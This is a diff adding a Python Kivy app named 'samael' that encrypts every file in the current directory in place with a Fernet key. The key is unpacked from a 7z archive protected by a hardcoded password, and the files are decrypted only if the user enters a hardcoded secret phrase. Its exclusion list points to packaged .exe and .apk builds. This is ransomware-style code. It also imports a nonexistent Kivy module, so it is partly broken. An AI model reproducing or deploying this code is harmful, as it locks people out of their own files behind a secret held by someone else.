@@ -1,0 +1,89 @@
+import os
+from cryptography.fernet import Fernet, InvalidToken
+import kivy
+from kivy.app import App
+from kivy.uix.boxlayout import BoxLayout
+from kivy.uix.label import Label
+from kivy.uix.button import Button
+from kivy.uix.textinput import TextInput
+from kivy.uix.scrolldown import ScrollView
+from kivy.uix.textinput import TextInput
+import py7zr
+
+# Hardcoded password for 7z file
+HARD_CODED_PASSWORD = "01123581321"
+
+class FileEncryptorApp(App):
+    def build(self):
+        self.output_area = TextInput(readonly=True, multiline=True, size_hint=(1, 0.8))
+        self.secret_input = TextInput(hint_text="Enter secret phrase for decryption", size_hint=(1, 0.1))
+        self.process_button = Button(text="Process Files", size_hint=(1, 0.1))
+        self.process_button.bind(on_press=self.process_files)
+
+        layout = BoxLayout(orientation='vertical')
+        layout.add_widget(self.output_area)
+        layout.add_widget(self.secret_input)
+        layout.add_widget(self.process_button)
+
+        return layout
+
+    def decrypt_key_file(self, encrypted_key_file_path):
+        with py7zr.SevenZipFile(encrypted_key_file_path, mode='r', password=HARD_CODED_PASSWORD) as archive:
+            archive.extractall()
+
+    def load_key(self):
+        try:
+            with open("thekey.key", "rb") as key_file:
+                return key_file.read()
+        except FileNotFoundError:
+            return None
+
+    def encrypt_files(self, files, key):
+        fernet = Fernet(key)
+        for file in files:
+            with open(file, "rb") as thefile:
+                content = thefile.read()
+            content_encrypted = fernet.encrypt(content)
+            with open(file, "wb") as thefile:
+                thefile.write(content_encrypted)
+            self.output_area.text += f"Encrypted {file} successfully!\n"
+
+    def decrypt_files(self, files, key):
+        fernet = Fernet(key)
+        secret_phrase = "Joydeep2005!"
+        
+        user_phrase = self.secret_input.text
+        if user_phrase == secret_phrase:
+            for file in files:
+                try:
+                    with open(file, "rb") as thefile:
+                        content = thefile.read()
+                    content_decrypted = fernet.decrypt(content)
+                    with open(file, "wb") as thefile:
+                        thefile.write(content_decrypted)
+                    self.output_area.text += f"Decrypted {file} successfully!\n"
+                except InvalidToken:
+                    self.output_area.text += f"Failed to decrypt {file}: Invalid key or the file is not encrypted.\n"
+                except Exception as e:
+                    self.output_area.text += f"An error occurred while processing {file}: {e}\n"
+        else:
+            self.output_area.text += "Invalid secret phrase! Please try again.\n"
+
+    def process_files(self, instance):
+        # List of files to process
+        files = [file for file in os.listdir() if file not in ["thekey.key", "samael.py", "protected_key.7z", "samael.exe", "samael.spec","samael.apk"] and os.path.isfile(file)]
+        self.output_area.text += "Files to process: " + ", ".join(files) + "\n"
+
+        # Decrypt the key file using the hardcoded password
+        self.decrypt_key_file("protected_key.7z")
+
+        # Load the key after decryption
+        key = self.load_key()
+        if key:
+            self.encrypt_files(files, key)
+
+            # Proceed to decrypt files after encryption
+            self.decrypt_files(files, key)
+
+if __name__ == "__main__":
+    FileEncryptorApp().run()
